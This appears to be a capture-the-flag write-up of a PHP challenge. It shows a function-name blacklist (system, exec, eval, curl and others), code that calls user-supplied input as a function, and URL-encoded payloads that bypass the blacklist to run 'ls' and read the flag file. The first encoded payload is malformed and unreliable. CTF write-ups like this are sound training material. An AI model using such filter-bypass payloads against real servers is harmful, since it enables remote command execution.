A quick poke around the URL revealed a robots.txt file which gave the first clue:

# you know de wae ma queen
User-Agent: *
Disallow: /?debug


Visiting http://35.196.45.11:8080/?debug provided the PHP source code that is driving the page:

```php

$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";

if(count($_GET) > 0){
    if(preg_match("/$blacklist/i",$_SERVER["REQUEST_URI"])) die("No no no hackers!!");
    list($key, $val) = each($_GET);
    $key($val);
}
?>
```

But The admin forgot that we can bypass the filter using url encoding , we can call system("ls"):

**http://35.196.45.11:8080/?%115%121%115%116%101%109=ls**

now print the long file name content :

**http://35.196.45.11:8080/?%73%79%73%74%65%6d=cat%20flag-a-long-name-that-you-wont-know.php**



`AceBear{I_did_something_stupid_with_url}`

